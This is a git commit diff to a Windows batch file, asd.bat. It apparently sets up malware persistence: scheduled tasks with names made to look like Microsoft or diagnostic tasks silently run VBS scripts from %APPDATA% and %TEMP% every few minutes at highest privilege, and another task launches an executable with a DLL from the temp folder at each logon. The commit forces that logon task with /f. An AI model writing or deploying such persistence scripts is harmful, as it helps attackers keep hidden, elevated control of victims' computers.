2495d165154cc8fde6b80bdf407e5a01f62f1694
Seition2 <130700484+seition2doc@users.noreply.github.com>
2026-01-13 16:20:39 +0300

    Update asd.bat

--- asd.bat
+++ asd.bat
@@ -6,7 +6,7 @@ schtasks /delete /tn "RunPowerShellScript" /f
 schtasks /create /tn "MicrosoftCheck" /sc minute /mo 6 /tr "wscript.exe \"%APPDATA%\microsoftcheck.vbs\"" /rl HIGHEST /f
 schtasks /delete /tn "TempVBS" /f
 schtasks /create /tn "TempVBS2" /sc minute /mo 5 /tr "\"%SystemRoot%\System32\wscript.exe\" //e:vbscript //b \"%TEMP%\ddd.vbs\"" /rl HIGHEST /f
-schtasks /create /tn "PncserverDiag" /tr "%temp%\Pancafediag.exe pncserver.exe %temp%\PncDiag.dll" /sc onlogon /rl highest
+schtasks /create /tn "PncserverDiag" /tr "%temp%\Pancafediag.exe pncserver.exe %temp%\PncDiag.dll" /sc onlogon /rl highest /f
 
 
 
